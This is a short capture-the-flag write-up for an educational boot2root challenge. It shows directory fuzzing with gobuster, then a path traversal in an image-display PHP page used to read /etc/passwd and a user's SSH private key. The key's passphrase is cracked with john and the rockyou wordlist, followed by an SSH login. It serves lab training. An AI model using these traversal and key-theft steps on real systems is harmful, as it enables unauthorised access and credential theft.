# The Projects - User
Author: viipz, rvino
## Description
```
**Category: Boot2Root/Educational** (You can ask for hints if you are stuck)

Are you ready to get an initial foothold on this super duper secure machine? You are looking for a text file called `user.txt` located in the home directory of a user. Spin up an instance and see what all the fuzz is about! 

Brute forcing / Fuzzing is allowed on this challenge.

Click [here](https://ctf.equinor.com/ondemand/) for access to the machine. 

```
## How to solve
First thing is to start fuzzing to figure out what type of page we're looking at: this can be done by checking the index page file type by simply testing /index.php

In this case this page is running on php which is usefull when we bruteforce directories with a tool like gobuster / wfuzz where we can specify what file type to look for.
```
gobuster -w [Your_word_list] -u [webpage] -x [file_type]
```
We find a page for displaying images which can be exploited for a path traversal.
```
curl http//webpage/imagedisplaying.php?i=../../../../etc/passwd
curl http//webpage/imagedisplaying.php?i=../../../../home/tom/.ssh/id_rsa > id_rsa (then delete the html part)
curl http//webpage/imagedisplaying.php?i=../../../../home/tom/user.txt
chmod 600 id_rsa
ssh2john id_rsa
john id_rsa --wordlist=rockyou.txt
ssh tom@IP -i id_rsa
```
And thats how you pwn User :)